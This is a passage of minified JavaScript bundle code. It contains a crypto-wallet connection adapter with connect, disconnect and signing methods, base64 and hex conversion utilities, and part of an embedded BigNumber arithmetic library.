                    throw o.constructor.name === "Web3ModalError" ? new LH : new DH(o == null ? void 0 : o.message,o)
                }
                e.client.on("session_delete", this._disconnected),
                this._wallet = e,
                this._address = t || "",
                this._state = Fs.Connected,
                this.emit("stateChanged", this._state),
                this.emit("connect", t)
            } catch (e) {
                throw this.emit("error", e),
                e
            } finally {
                this._connecting = !1
            }
        })
    }
    disconnect() {
        return gy(this, void 0, void 0, function*() {
            if (this.state === Fs.NotFound)
                return;
            const e = this._wallet;
            if (e) {
                e.client.off("session_delete", this._disconnected),
                this._wallet = null,
                this._address = null;
                try {
                    yield e.disconnect()
                } catch (t) {
                    this.emit("error", new FH(t == null ? void 0 : t.message,t))
                }
            }
            this._state = Fs.Disconnect,
            this.emit("disconnect"),
            this.emit("stateChanged", this._state)
        })
    }
    signTransaction(e) {
        return gy(this, void 0, void 0, function*() {
            if (this.state !== Fs.Connected)
                throw new zv;
            try {
                const t = this._wallet;
                if (!t)
                    throw new zv;
                try {
                    return yield t.signTransaction({
                        transaction: e
                    })
                } catch (o) {
                    throw new kH(o == null ? void 0 : o.message,o)
                }
            } catch (t) {
                throw this.emit("error", t),
                t
            }
        })
    }
    signMessage(e) {
        return gy(this, void 0, void 0, function*() {
            try {
                const t = this._wallet;
                if (!t)
                    throw new zv;
                try {
                    return yield t.signMessage(e)
                } catch (o) {
                    throw new UH(o == null ? void 0 : o.message,o)
                }
            } catch (t) {
                throw this.emit("error", t),
                t
            }
        })
    }
}
const Xn = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
class PD {
    encode(e) {
        let t = "", o, i, n, s, a, l, f, h = 0;
        for (; h < e.length; )
            o = e.charCodeAt(h++),
            i = e.charCodeAt(h++),
            n = e.charCodeAt(h++),
            s = o >> 2,
            a = (o & 3) << 4 | i >> 4,
            l = (i & 15) << 2 | n >> 6,
            f = n & 63,
            isNaN(i) ? l = f = 64 : isNaN(n) && (f = 64),
            t = t + Xn.charAt(s) + Xn.charAt(a) + Xn.charAt(l) + Xn.charAt(f);
        return t
    }
    encodeIgnoreUtf8(e) {
        let t = "", o, i, n, s, a, l, f, h = 0;
        for (; h < e.length; )
            o = e[h++],
            i = e[h++],
            n = e[h++],
            s = o >> 2,
            a = (o & 3) << 4 | i >> 4,
            l = (i & 15) << 2 | n >> 6,
            f = n & 63,
            isNaN(i) ? l = f = 64 : isNaN(n) && (f = 64),
            t = t + Xn.charAt(s) + Xn.charAt(a) + Xn.charAt(l) + Xn.charAt(f);
        return t
    }
    decode(e) {
        let t = "", o, i, n, s, a, l, f, h = 0;
        for (e = e.replace(/[^A-Za-z0-9\+\/\=]/g, ""); h < e.length; )
            s = Xn.indexOf(e.charAt(h++)),
            a = Xn.indexOf(e.charAt(h++)),
            l = Xn.indexOf(e.charAt(h++)),
            f = Xn.indexOf(e.charAt(h++)),
            o = s << 2 | a >> 4,
            i = (a & 15) << 4 | l >> 2,
            n = (l & 3) << 6 | f,
            t = t + String.fromCharCode(o),
            l != 64 && (t = t + String.fromCharCode(i)),
            f != 64 && (t = t + String.fromCharCode(n));
        return this._utf8_decode(t)
    }
    decodeToByteArray(e) {
        let t = "", o, i, n, s, a, l, f, h = 0;
        for (e = e.replace(/[^A-Za-z0-9\+\/\=]/g, ""); h < e.length; )
            s = Xn.indexOf(e.charAt(h++)),
            a = Xn.indexOf(e.charAt(h++)),
            l = Xn.indexOf(e.charAt(h++)),
            f = Xn.indexOf(e.charAt(h++)),
            o = s << 2 | a >> 4,
            i = (a & 15) << 4 | l >> 2,
            n = (l & 3) << 6 | f,
            t = t + String.fromCharCode(o),
            l != 64 && (t = t + String.fromCharCode(i)),
            f != 64 && (t = t + String.fromCharCode(n));
        return this._out2ByteArray(t)
    }
    _out2ByteArray(e) {
        const t = new Array(e.length);
        let o = 0
          , i = 0;
        for (; o < e.length; )
            i = e.charCodeAt(o),
            t[o] = i,
            o++;
        return t
    }
    _utf8_encode(e) {
        e = e.replace(/\r\n/g, `
`);
        let t = "";
        for (let o = 0; o < e.length; o++) {
            const i = e.charCodeAt(o);
            i < 128 ? t += String.fromCharCode(i) : i > 127 && i < 2048 ? (t += String.fromCharCode(i >> 6 | 192),
            t += String.fromCharCode(i & 63 | 128)) : (t += String.fromCharCode(i >> 12 | 224),
            t += String.fromCharCode(i >> 6 & 63 | 128),
            t += String.fromCharCode(i & 63 | 128))
        }
        return t
    }
    _utf8_decode(e) {
        let t = ""
          , o = 0
          , i = 0
          , n = 0
          , s = 0;
        for (; o < e.length; )
            i = e.charCodeAt(o),
            i < 128 ? (t += String.fromCharCode(i),
            o++) : i > 191 && i < 224 ? (n = e.charCodeAt(o + 1),
            t += String.fromCharCode((i & 31) << 6 | n & 63),
            o += 2) : (n = e.charCodeAt(o + 1),
            s = e.charCodeAt(o + 2),
            t += String.fromCharCode((i & 15) << 12 | (n & 63) << 6 | s & 63),
            o += 3);
        return t
    }
}
function $1(r) {
    if (r < 0 || r > 255)
        throw new Error("Input must be a byte");
    const e = "0123456789ABCDEF";
    let t = "";
    return t += e.charAt(r >> 4),
    t += e.charAt(r & 15),
    t
}
function $3(r) {
    let e = "";
    for (let t = 0; t < r.length; t++) {
        const o = r[t].toString(2)
          , i = o.match(/^1+?(?=0)/);
        if (i && o.length === 8) {
            const n = i[0].length;
            let s = r[t].toString(2).slice(7 - n);
            for (let a = 1; a < n; a++)
                s += r[a + t].toString(2).slice(2);
            e += String.fromCharCode(parseInt(s, 2)),
            t += n - 1
        } else
            e += String.fromCharCode(r[t])
    }
    return e
}
function CD(r) {
    const e = r.replace(/^0x/, "").split("");
    let t = "";
    for (let o = 0; o < e.length / 2; o++) {
        const i = `0x${e[o * 2]}${e[o * 2 + 1]}`;
        t += String.fromCharCode(parseInt(i))
    }
    return t
}
function mr(r) {
    let e = "";
    for (let t = 0; t < r.length; t++)
        e += $1(r[t]);
    return e
}
function Iu(r) {
    return new PD().decodeToByteArray(r)
}
function z3(r) {
    return new PD().encodeIgnoreUtf8(r)
}
const _ce = Object.freeze(Object.defineProperty({
    __proto__: null,
    base64DecodeFromString: Iu,
    base64EncodeToString: z3,
    byte2hexStr: $1,
    byteArray2hexStr: mr,
    bytesToString: $3,
    hextoString: CD
}, Symbol.toStringTag, {
    value: "Module"
}));
function Ice(r) {
    return $3(r)
}
function Oce(r, e, t=!1) {
    if (r.length != e.length)
        return !1;
    for (let o = 0; o < r.length; o++)
        if (t) {
            if (r[o] != e[o])
                return !1
        } else if (JSON.stringify(r[o]) != JSON.stringify(e[o]))
            return !1;
    return !0
}
function Rce(r) {
    const e = []
      , t = r.length;
    let o;
    for (let i = 0; i < t; i++)
        o = r.charCodeAt(i),
        o >= 65536 && o <= 1114111 ? (e.push(o >> 18 & 7 | 240),
        e.push(o >> 12 & 63 | 128),
        e.push(o >> 6 & 63 | 128),
        e.push(o & 63 | 128)) : o >= 2048 && o <= 65535 ? (e.push(o >> 12 & 15 | 224),
        e.push(o >> 6 & 63 | 128),
        e.push(o & 63 | 128)) : o >= 128 && o <= 2047 ? (e.push(o >> 6 & 31 | 192),
        e.push(o & 63 | 128)) : e.push(o & 255);
    return e
}
function SD(r) {
    let e;
    if (r >= "A" && r <= "F" ? e = r.charCodeAt(0) - 65 + 10 : r >= "a" && r <= "f" ? e = r.charCodeAt(0) - 97 + 10 : r >= "0" && r <= "9" && (e = r.charCodeAt(0) - 48),
    typeof e == "number")
        return e;
    throw new Error("The passed hex char is not a valid hex char")
}
function j3(r) {
    return r >= "A" && r <= "F" || r >= "a" && r <= "f" || r >= "0" && r <= "9" ? 1 : 0
}
function bo(r, e=!1) {
    let t = r.length;
    e && t % 2 && (r = `0${r}`,
    t++);
    const o = [];
    let i = 0
      , n = 0
      , s = 0;
    for (let a = 0; a < t; a++) {
        const l = r.charAt(a);
        if (j3(l))
            i <<= 4,
            i += SD(l),
            n++,
            n % 2 === 0 && (o[s++] = i,
            i = 0);
        else
            throw new Error("The passed hex char is not a valid hex string")
    }
    return o
}
function Wce(r) {
    if (!/^\d{4}-\d{2}-\d{2}( \d{2}-\d{2}-\d{2}|)/.test(r))
        throw new Error("The passed date string is not valid");
    const e = r.split(" ")
      , t = e[0].split("-")
      , o = parseInt(t[0], 10)
      , i = parseInt(t[1], 10) - 1
      , n = parseInt(t[2], 10);
    if (e.length > 1) {
        const s = e[1].split("-")
          , a = parseInt(s[0], 10)
          , l = parseInt(s[1], 10)
          , f = parseInt(s[2], 10);
        return new Date(o,i,n,a,l,f)
    }
    return new Date(o,i,n)
}
function BD(r) {
    return r >= "0" && r <= "9" ? 1 : 0
}
function Mce(r) {
    if (r == null || r.length == 0 || r == "")
        return -1;
    let e = 0;
    if (r.length == 40)
        for (; e < 40; e++) {
            const t = r.charAt(e);
            if (!j3(t))
                break
        }
    if (e == 40)
        return 1;
    for (e = 0; e < r.length; e++) {
        const t = r.charAt(e);
        if (!BD(t))
            break
    }
    if (e == r.length)
        return 2;
    for (e = 0; e < r.length; e++)
        if (r.charAt(e) > " ")
            return 3;
    return -1
}
const Nce = Object.freeze(Object.defineProperty({
    __proto__: null,
    arrayEquals: Oce,
    base64DecodeFromString: Iu,
    base64EncodeToString: z3,
    bin2String: Ice,
    byte2hexStr: $1,
    byteArray2hexStr: mr,
    bytesToString: $3,
    getStringType: Mce,
    hexChar2byte: SD,
    hexStr2byteArray: bo,
    hextoString: CD,
    isHexChar: j3,
    isNumber: BD,
    strToDate: Wce,
    stringToBytes: Rce
}, Symbol.toStringTag, {
    value: "Module"
}));
var Dce = /^-?(?:\d+(?:\.\d*)?|\.\d+)(?:e[+-]?\d+)?$/i
  , O2 = Math.ceil
  , Si = Math.floor
  , _o = "[BigNumber Error] "
  , Q_ = _o + "Number primitive has more than 15 significant digits: "
  , Xi = 1e14
  , Ft = 14
  , eI = 9007199254740991
  , R2 = [1, 10, 100, 1e3, 1e4, 1e5, 1e6, 1e7, 1e8, 1e9, 1e10, 1e11, 1e12, 1e13]
  , Tc = 1e7
  , Qo = 1e9;
function _D(r) {
    var e, t, o, i = P.prototype = {
        constructor: P,
        toString: null,
        valueOf: null
    }, n = new P(1), s = 20, a = 4, l = -7, f = 21, h = -1e7, p = 1e7, b = !1, v = 1, T = 0, x = {
        prefix: "",
        groupSize: 3,
        secondaryGroupSize: 0,
        groupSeparator: ",",
        decimalSeparator: ".",
        fractionGroupSize: 0,
        fractionGroupSeparator: "",
        suffix: ""
    }, E = "0123456789abcdefghijklmnopqrstuvwxyz", B = !0;
    function P(C, W) {
        var k, H, X, Y, V, R, _, $, z = this;
        if (!(z instanceof P))
            return new P(C,W);
        if (W == null) {
            if (C && C._isBigNumber === !0) {
                z.s = C.s,
                !C.c || C.e > p ? z.c = z.e = null : C.e < h ? z.c = [z.e = 0] : (z.e = C.e,
                z.c = C.c.slice());
                return
            }
            if ((R = typeof C == "number") && C * 0 == 0) {
                if (z.s = 1 / C < 0 ? (C = -C,
                -1) : 1,
                C === ~~C) {
                    for (Y = 0,
                    V = C; V >= 10; V /= 10,
                    Y++)
                        ;
                    Y > p ? z.c = z.e = null : (z.e = Y,
                    z.c = [C]);
                    return
                }
                $ = String(C)
            } else {
                if (!Dce.test($ = String(C)))
                    return o(z, $, R);
                z.s = $.charCodeAt(0) == 45 ? ($ = $.slice(1),
                -1) : 1
            }
            (Y = $.indexOf(".")) > -1 && ($ = $.replace(".", "")),
            (V = $.search(/e/i)) > 0 ? (Y < 0 && (Y = V),
            Y += +$.slice(V + 1),
            $ = $.substring(0, V)) : Y < 0 && (Y = $.length)
        } else {
            if (Vr(W, 2, E.length, "Base"),
            W == 10 && B)
                return z = new P(C),
                I(z, s + z.e + 1, a);
            if ($ = String(C),
            R = typeof C == "number") {
                if (C * 0 != 0)
                    return o(z, $, R, W);
                if (z.s = 1 / C < 0 ? ($ = $.slice(1),
                -1) : 1,
                P.DEBUG && $.replace(/^0\.0*|\./, "").length > 15)
                    throw Error(Q_ + C)
            } else
                z.s = $.charCodeAt(0) === 45 ? ($ = $.slice(1),
                -1) : 1;
            for (k = E.slice(0, W),
            Y = V = 0,
            _ = $.length; V < _; V++)
                if (k.indexOf(H = $.charAt(V)) < 0) {
                    if (H == ".") {
                        if (V > Y) {
                            Y = _;
                            continue
                        }
                    } else if (!X && ($ == $.toUpperCase() && ($ = $.toLowerCase()) || $ == $.toLowerCase() && ($ = $.toUpperCase()))) {
                        X = !0,
                        V = -1,
                        Y = 0;
                        continue
                    }
                    return o(z, String(C), R, W)
                }
            R = !1,
            $ = t($, W, 10, z.s),
            (Y = $.indexOf(".")) > -1 ? $ = $.replace(".", "") : Y = $.length
        }
        for (V = 0; $.charCodeAt(V) === 48; V++)
            ;
        for (_ = $.length; $.charCodeAt(--_) === 48; )
            ;
        if ($ = $.slice(V, ++_)) {
            if (_ -= V,
            R && P.DEBUG && _ > 15 && (C > eI || C !== Si(C)))
                throw Error(Q_ + z.s * C);
            if ((Y = Y - V - 1) > p)
                z.c = z.e = null;
            else if (Y < h)
                z.c = [z.e = 0];
            else {
                if (z.e = Y,
                z.c = [],
                V = (Y + 1) % Ft,
                Y < 0 && (V += Ft),
                V < _) {
                    for (V && z.c.push(+$.slice(0, V)),
                    _ -= Ft; V < _; )
                        z.c.push(+$.slice(V, V += Ft));
                    V = Ft - ($ = $.slice(V)).length
                } else
                    V -= _;
                for (; V--; $ += "0")
                    ;
                z.c.push(+$)
            }
        } else
            z.c = [z.e = 0]
    }
    P.clone = _D,
    P.ROUND_UP = 0,
    P.ROUND_DOWN = 1,
    P.ROUND_CEIL = 2,
    P.ROUND_FLOOR = 3,
    P.ROUND_HALF_UP = 4,
    P.ROUND_HALF_DOWN = 5,
    P.ROUND_HALF_EVEN = 6,
    P.ROUND_HALF_CEIL = 7,
    P.ROUND_HALF_FLOOR = 8,
    P.EUCLID = 9,
    P.config = P.set = function(C) {
        var W, k;
        if (C != null)
            if (typeof C == "object") {
                if (C.hasOwnProperty(W = "DECIMAL_PLACES") && (k = C[W],
                Vr(k, 0, Qo, W),
                s = k),
                C.hasOwnProperty(W = "ROUNDING_MODE") && (k = C[W],
                Vr(k, 0, 8, W),
                a = k),
                C.hasOwnProperty(W = "EXPONENTIAL_AT") && (k = C[W],
                k && k.pop ? (Vr(k[0], -1e9, 0, W),
                Vr(k[1], 0, Qo, W),
                l = k[0],
                f = k[1]) : (Vr(k, -1e9, Qo, W),
                l = -(f = k < 0 ? -k : k))),
                C.hasOwnProperty(W = "RANGE"))
                    if (k = C[W],
                    k && k.pop)
                        Vr(k[0], -1e9, -1, W),
                        Vr(k[1], 1, Qo, W),
                        h = k[0],
                        p = k[1];
                    else if (Vr(k, -1e9, Qo, W),
                    k)
                        h = -(p = k < 0 ? -k : k);
                    else
                        throw Error(_o + W + " cannot be zero: " + k);
                if (C.hasOwnProperty(W = "CRYPTO"))
                    if (k = C[W],
                    k === !!k)
                        if (k)
                            if (typeof crypto < "u" && crypto && (crypto.getRandomValues || crypto.randomBytes))
                                b = k;
                            else
                                throw b = !k,
                                Error(_o + "crypto unavailable");
                        else
                            b = k;
                    else
                        throw Error(_o + W + " not true or false: " + k);
                if (C.hasOwnProperty(W = "MODULO_MODE") && (k = C[W],
                Vr(k, 0, 9, W),
                v = k),
                C.hasOwnProperty(W = "POW_PRECISION") && (k = C[W],
                Vr(k, 0, Qo, W),
                T = k),
                C.hasOwnProperty(W = "FORMAT"))
                    if (k = C[W],
                    typeof k == "object")
                        x = k;
                    else
                        throw Error(_o + W + " not an object: " + k);
                if (C.hasOwnProperty(W = "ALPHABET"))
                    if (k = C[W],
                    typeof k == "string" && !/^.?$|[+\-.\s]|(.).*\1/.test(k))
                        B = k.slice(0, 10) == "0123456789",
                        E = k;
                    else
                        throw Error(_o + W + " invalid: " + k)
            } else
                throw Error(_o + "Object expected: " + C);
        return {
            DECIMAL_PLACES: s,
            ROUNDING_MODE: a,
            EXPONENTIAL_AT: [l, f],
            RANGE: [h, p],
            CRYPTO: b,
            MODULO_MODE: v,
            POW_PRECISION: T,
            FORMAT: x,
            ALPHABET: E
        }
    }
    ,
    P.isBigNumber = function(C) {
        if (!C || C._isBigNumber !== !0)
            return !1;
        if (!P.DEBUG)
            return !0;
        var W, k, H = C.c, X = C.e, Y = C.s;
        e: if ({}.toString.call(H) == "[object Array]") {
            if ((Y === 1 || Y === -1) && X >= -1e9 && X <= Qo && X === Si(X)) {
                if (H[0] === 0) {
                    if (X === 0 && H.length === 1)
                        return !0;
                    break e
                }
                if (W = (X + 1) % Ft,
                W < 1 && (W += Ft),
                String(H[0]).length == W) {
                    for (W = 0; W < H.length; W++)
                        if (k = H[W],
                        k < 0 || k >= Xi || k !== Si(k))
                            break e;
                    if (k !== 0)
                        return !0
                }
            }
        } else if (H === null && X === null && (Y === null || Y === 1 || Y === -1))
            return !0;
        throw Error(_o + "Invalid BigNumber: " + C)
    }
    ,
    P.maximum = P.max = function() {
        return F(arguments, -1)
    }
    ,
    P.minimum = P.min = function() {
        return F(arguments, 1)
    }
    ,
    P.random = function() {
        var C = 9007199254740992
          , W = Math.random() * C & 2097151 ? function() {
            return Si(Math.random() * C)
        }
        : function() {
            return (Math.random() * 1073741824 | 0) * 8388608 + (Math.random() * 8388608 | 0)
        }
        ;
        return function(k) {
            var H, X, Y, V, R, _ = 0, $ = [], z = new P(n);
            if (k == null ? k = s : Vr(k, 0, Qo),
            V = O2(k / Ft),
            b)
                if (crypto.getRandomValues) {
                    for (H = crypto.getRandomValues(new Uint32Array(V *= 2)); _ < V; )
                        R = H[_] * 131072 + (H[_ + 1] >>> 11),
                        R >= 9e15 ? (X = crypto.getRandomValues(new Uint32Array(2)),
                        H[_] = X[0],
                        H[_ + 1] = X[1]) : ($.push(R % 1e14),
                        _ += 2);
                    _ = V / 2
                } else if (crypto.randomBytes) {
                    for (H = crypto.randomBytes(V *= 7); _ < V; )
                        R = (H[_] & 31) * 281474976710656 + H[_ + 1] * 1099511627776 + H[_ + 2] * 4294967296 + H[_ + 3] * 16777216 + (H[_ + 4] << 16) + (H[_ + 5] << 8) + H[_ + 6],
                        R >= 9e15 ? crypto.randomBytes(7).copy(H, _) : ($.push(R % 1e14),
                        _ += 7);
                    _ = V / 7
                } else
                    throw b = !1,
                    Error(_o + "crypto unavailable");
            if (!b)
                for (; _ < V; )
                    R = W(),
                    R < 9e15 && ($[_++] = R % 1e14);
            for (V = $[--_],
            k %= Ft,
            V && k && (R = R2[Ft - k],
            $[_] = Si(V / R) * R); $[_] === 0; $.pop(),
            _--)
                ;
            if (_ < 0)
                $ = [Y = 0];
            else {
                for (Y = -1; $[0] === 0; $.splice(0, 1),
                Y -= Ft)
                    ;
                for (_ = 1,
                R = $[0]; R >= 10; R /= 10,
                _++)
                    ;
                _ < Ft && (Y -= Ft - _)
            }
            return z.e = Y,
            z.c = $,
            z
        }
    }(),
    P.sum = function() {
        for (var C = 1, W = arguments, k = new P(W[0]); C < W.length; )
            k = k.plus(W[C++]);
        return k
    }
    ,
    t = function() {
        var C = "0123456789";
        function W(k, H, X, Y) {
            for (var V, R = [0], _, $ = 0, z = k.length; $ < z; ) {
                for (_ = R.length; _--; R[_] *= H)
                    ;
                for (R[0] += Y.indexOf(k.charAt($++)),
                V = 0; V < R.length; V++)
                    R[V] > X - 1 && (R[V + 1] == null && (R[V + 1] = 0),
                    R[V + 1] += R[V] / X | 0,
                    R[V] %= X)
            }
            return R.reverse()
        }
        return function(k, H, X, Y, V) {
            var R, _, $, z, K, j, ee, ie, ae = k.indexOf("."), he = s, me = a;
            for (ae >= 0 && (z = T,
            T = 0,
            k = k.replace(".", ""),
            ie = new P(H),
            j = ie.pow(k.length - ae),
            T = z,
            ie.c = W(Ta(Ti(j.c), j.e, "0"), 10, X, C),
            ie.e = ie.c.length),
            ee = W(k, H, X, V ? (R = E,
            C) : (R = C,
            E)),
            $ = z = ee.length; ee[--z] == 0; ee.pop())
                ;
            if (!ee[0])
                return R.charAt(0);
            if (ae < 0 ? --$ : (j.c = ee,
            j.e = $,
            j.s = Y,
            j = e(j, ie, he, me, X),
            ee = j.c,
            K = j.r,
            $ = j.e),
            _ = $ + he + 1,
            ae = ee[_],
            z = X / 2,
            K = K || _ < 0 || ee[_ + 1] != null,
            K = me < 4 ? (ae != null || K) && (me == 0 || me == (j.s < 0 ? 3 : 2)) : ae > z || ae == z && (me == 4 || K || me == 6 && ee[_ - 1] & 1 || me == (j.s < 0 ? 8 : 7)),
            _ < 1 || !ee[0])
                k = K ? Ta(R.charAt(1), -he, R.charAt(0)) : R.charAt(0);
            else {
                if (ee.length = _,
                K)
                    for (--X; ++ee[--_] > X; )
                        ee[_] = 0,
                        _ || (++$,
                        ee = [1].concat(ee));
                for (z = ee.length; !ee[--z]; )
                    ;
                for (ae = 0,
                k = ""; ae <= z; k += R.charAt(ee[ae++]))
                    ;
                k = Ta(k, $, R.charAt(0))
            }
            return k
        }
    }(),
    e = function() {
        function C(H, X, Y) {
            var V, R, _, $, z = 0, K = H.length, j = X % Tc, ee = X / Tc | 0;
            for (H = H.slice(); K--; )
                _ = H[K] % Tc,
                $ = H[K] / Tc | 0,
                V = ee * _ + $ * j,
                R = j * _ + V % Tc * Tc + z,
                z = (R / Y | 0) + (V / Tc | 0) + ee * $,
                H[K] = R % Y;
            return z && (H = [z].concat(H)),
            H
        }
        function W(H, X, Y, V) {
            var R, _;
            if (Y != V)
                _ = Y > V ? 1 : -1;
            else
                for (R = _ = 0; R < Y; R++)
                    if (H[R] != X[R]) {
                        _ = H[R] > X[R] ? 1 : -1;
                        break
                    }
            return _
        }
        function k(H, X, Y, V) {
            for (var R = 0; Y--; )
                H[Y] -= R,
                R = H[Y] < X[Y] ? 1 : 0,
                H[Y] = R * V + H[Y] - X[Y];
            for (; !H[0] && H.length > 1; H.splice(0, 1))
                ;
        }
        return function(H, X, Y, V, R) {
            var _, $, z, K, j, ee, ie, ae, he, me, Pe, _e, Fe, Je, rt, xt, Tt, Qe = H.s == X.s ? 1 : -1, Ye = H.c, Bt = X.c;
            if (!Ye || !Ye[0] || !Bt || !Bt[0])
                return new P(!H.s || !X.s || (Ye ? Bt && Ye[0] == Bt[0] : !Bt) ? NaN : Ye && Ye[0] == 0 || !Bt ? Qe * 0 : Qe / 0);
            for (ae = new P(Qe),
            he = ae.c = [],
            $ = H.e - X.e,
            Qe = Y + $ + 1,
            R || (R = Xi,
            $ = Bi(H.e / Ft) - Bi(X.e / Ft),
            Qe = Qe / Ft | 0),
            z = 0; Bt[z] == (Ye[z] || 0); z++)
                ;
            if (Bt[z] > (Ye[z] || 0) && $--,
            Qe < 0)
                he.push(1),
                K = !0;
            else {
                for (Je = Ye.length,
                xt = Bt.length,
                z = 0,
                Qe += 2,
                j = Si(R / (Bt[0] + 1)),
                j > 1 && (Bt = C(Bt, j, R),
                Ye = C(Ye, j, R),
                xt = Bt.length,
                Je = Ye.length),
                Fe = xt,
                me = Ye.slice(0, xt),
                Pe = me.length; Pe < xt; me[Pe++] = 0)
                    ;
                Tt = Bt.slice(),
                Tt = [0].concat(Tt),
                rt = Bt[0],
                Bt[1] >= R / 2 && rt++;
                do {
                    if (j = 0,
                    _ = W(Bt, me, xt, Pe),
                    _ < 0) {
                        if (_e = me[0],
                        xt != Pe && (_e = _e * R + (me[1] || 0)),
                        j = Si(_e / rt),
                        j > 1)
                            for (j >= R && (j = R - 1),
                            ee = C(Bt, j, R),
                            ie = ee.length,
                            Pe = me.length; W(ee, me, ie, Pe) == 1; )
                                j--,
                                k(ee, xt < ie ? Tt : Bt, ie, R),
                                ie = ee.length,
                                _ = 1;
                        else
                            j == 0 && (_ = j = 1),
                            ee = Bt.slice(),
                            ie = ee.length;
                        if (ie < Pe && (ee = [0].concat(ee)),
                        k(me, ee, Pe, R),
                        Pe = me.length,
                        _ == -1)
                            for (; W(Bt, me, xt, Pe) < 1; )
                                j++,
                                k(me, xt < Pe ? Tt : Bt, Pe, R),
                                Pe = me.length
                    } else
                        _ === 0 && (j++,
                        me = [0]);
                    he[z++] = j,
                    me[0] ? me[Pe++] = Ye[Fe] || 0 : (me = [Ye[Fe]],
                    Pe = 1)
                } while ((Fe++ < Je || me[0] != null) && Qe--);
                K = me[0] != null,
                he[0] || he.splice(0, 1)
            }
            if (R == Xi) {
                for (z = 1,
                Qe = he[0]; Qe >= 10; Qe /= 10,
                z++)
                    ;
                I(ae, Y + (ae.e = z + $ * Ft - 1) + 1, V, K)
            } else
                ae.e = $,
                ae.r = +K;
            return ae
        }
    }();
    function O(C, W, k, H) {
        var X, Y, V, R, _;
        if (k == null ? k = a : Vr(k, 0, 8),
        !C.c)
            return C.toString();
        if (X = C.c[0],
        V = C.e,
        W == null)
            _ = Ti(C.c),
            _ = H == 1 || H == 2 && (V <= l || V >= f) ? by(_, V) : Ta(_, V, "0");
        else if (C = I(new P(C), W, k),
        Y = C.e,
        _ = Ti(C.c),
        R = _.length,
        H == 1 || H == 2 && (W <= Y || Y <= l)) {
            for (; R < W; _ += "0",
            R++)
                ;
            _ = by(_, Y)
        } else if (W -= V,
        _ = Ta(_, Y, "0"),
        Y + 1 > R) {
            if (--W > 0)
                for (_ += "."; W--; _ += "0")
                    ;
        } else if (W += Y - R,
        W > 0)
            for (Y + 1 == R && (_ += "."); W--; _ += "0")
                ;
        return C.s < 0 && X ? "-" + _ : _
    }
    function F(C, W) {
        for (var k, H, X = 1, Y = new P(C[0]); X < C.length; X++)
            H = new P(C[X]),
            (!H.s || (k = Sl(Y, H)) === W || k === 0 && Y.s === W) && (Y = H);
        return Y
    }
    function D(C, W, k) {
        for (var H = 1, X = W.length; !W[--X]; W.pop())
            ;
        for (X = W[0]; X >= 10; X /= 10,
        H++)
            ;
        return (k = H + k * Ft - 1) > p ? C.c = C.e = null : k < h ? C.c = [C.e = 0] : (C.e = k,
        C.c = W),
        C
    }
    o = function() {
        var C = /^(-?)0([xbo])(?=\w[\w.]*$)/i
          , W = /^([^.]+)\.$/
          , k = /^\.([^.]+)$/
          , H = /^-?(Infinity|NaN)$/
          , X = /^\s*\+(?=[\w.])|^\s+|\s+$/g;
        return function(Y, V, R, _) {
            var $, z = R ? V : V.replace(X, "");
            if (H.test(z))
                Y.s = isNaN(z) ? null : z < 0 ? -1 : 1;
            else {
                if (!R && (z = z.replace(C, function(K, j, ee) {
                    return $ = (ee = ee.toLowerCase()) == "x" ? 16 : ee == "b" ? 2 : 8,
                    !_ || _ == $ ? j : K
                }),
                _ && ($ = _,
                z = z.replace(W, "$1").replace(k, "0.$1")),
                V != z))
                    return new P(z,$);
                if (P.DEBUG)
                    throw Error(_o + "Not a" + (_ ? " base " + _ : "") + " number: " + V);
                Y.s = null
            }
            Y.c = Y.e = null
        }
    }();
    function I(C, W, k, H) {
        var X, Y, V, R, _, $, z, K = C.c, j = R2;
        if (K) {
            e: {
                for (X = 1,
                R = K[0]; R >= 10; R /= 10,
                X++)
                    ;
                if (Y = W - X,
                Y < 0)
                    Y += Ft,
                    V = W,
                    _ = K[$ = 0],
                    z = Si(_ / j[X - V - 1] % 10);
                else if ($ = O2((Y + 1) / Ft),
                $ >= K.length)
                    if (H) {
                        for (; K.length <= $; K.push(0))
                            ;
                        _ = z = 0,
                        X = 1,
                        Y %= Ft,
                        V = Y - Ft + 1
                    } else
                        break e;
                else {
                    for (_ = R = K[$],
                    X = 1; R >= 10; R /= 10,
                    X++)
                        ;
                    Y %= Ft,
                    V = Y - Ft + X,
                    z = V < 0 ? 0 : Si(_ / j[X - V - 1] % 10)
                }
                if (H = H || W < 0 || K[$ + 1] != null || (V < 0 ? _ : _ % j[X - V - 1]),
                H = k < 4 ? (z || H) && (k == 0 || k == (C.s < 0 ? 3 : 2)) : z > 5 || z == 5 && (k == 4 || H || k == 6 && (Y > 0 ? V > 0 ? _ / j[X - V] : 0 : K[$ - 1]) % 10 & 1 || k == (C.s < 0 ? 8 : 7)),
                W < 1 || !K[0])
                    return K.length = 0,
                    H ? (W -= C.e + 1,
                    K[0] = j[(Ft - W % Ft) % Ft],
                    C.e = -W || 0) : K[0] = C.e = 0,
                    C;
                if (Y == 0 ? (K.length = $,
                R = 1,
                $--) : (K.length = $ + 1,
                R = j[Ft - Y],
                K[$] = V > 0 ? Si(_ / j[X - V] % j[V]) * R : 0),
                H)
                    for (; ; )
                        if ($ == 0) {
                            for (Y = 1,
                            V = K[0]; V >= 10; V /= 10,
                            Y++)
                                ;
                            for (V = K[0] += R,
                            R = 1; V >= 10; V /= 10,
                            R++)
                                ;
                            Y != R && (C.e++,
                            K[0] == Xi && (K[0] = 1));
                            break
                        } else {
                            if (K[$] += R,
                            K[$] != Xi)
                                break;
                            K[$--] = 0,
                            R = 1
                        }
                for (Y = K.length; K[--Y] === 0; K.pop())
                    ;
            }
            C.e > p ? C.c = C.e = null : C.e < h && (C.c = [C.e = 0])
        }
        return C
    }
    function M(C) {
        var W, k = C.e;
        return k === null ? C.toString() : (W = Ti(C.c),
        W = k <= l || k >= f ? by(W, k) : Ta(W, k, "0"),
        C.s < 0 ? "-" + W : W)
    }
    return i.absoluteValue = i.abs = function() {
        var C = new P(this);
        return C.s < 0 && (C.s = 1),
        C
    }
    ,
    i.comparedTo = function(C, W) {
        return Sl(this, new P(C,W))
    }
    ,
    i.decimalPlaces = i.dp = function(C, W) {
        var k, H, X, Y = this;
        if (C != null)
            return Vr(C, 0, Qo),
            W == null ? W = a : Vr(W, 0, 8),
            I(new P(Y), C + Y.e + 1, W);
        if (!(k = Y.c))
            return null;
        if (H = ((X = k.length - 1) - Bi(this.e / Ft)) * Ft,
        X = k[X])
            for (; X % 10 == 0; X /= 10,
            H--)
                ;
        return H < 0 && (H = 0),
        H
    }
    ,
